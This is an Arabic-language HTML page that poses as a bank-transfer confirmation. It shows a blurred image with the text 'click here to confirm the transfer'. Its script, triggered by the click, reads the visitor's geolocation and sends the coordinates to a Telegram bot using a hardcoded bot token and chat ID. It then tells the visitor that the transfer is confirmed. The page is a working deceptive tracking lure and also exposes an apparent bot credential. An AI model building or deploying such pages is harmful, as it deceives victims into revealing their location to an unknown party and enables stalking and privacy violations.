<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirm Action</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    #card {
      cursor: pointer;
      width: 400px;
      height: 300px;
      background-image: url('https://i.ibb.co/6cPGnqQn/IMG-20250826-WA0011.jpg');
      background-size: cover;
      background-position: center;
      filter: blur(2px); /* لتغبيش الصورة */
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-weight: bold;
      font-size: 20px;
      text-shadow: 1px 1px 2px black;
    }
  </style>
</head>
<body>
  <div id="card">اضغط هنا لتأكيد الحوالة</div>

  <script>
    const card = document.getElementById('card');
    const BOT_TOKEN = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM"; // توكن البوت
    const CHAT_ID = "6495557039"; // معرف الشات

    card.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          // إرسال الموقع للبوت
          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `Lat: ${lat}\nLon: ${lon}`
            })
          }).then(() => {
            alert('تم تأكيد الحوالة!');
          }).catch(err => {
            console.error(err);
            alert('فشل إرسال الموقع.');
          });
        }, () => {
          alert('تعذر الحصول على الموقع.');
        });
      } else {
        alert('الموقع غير مدعوم في المتصفح.');
      }
    });
  </script>
</body>
</html>
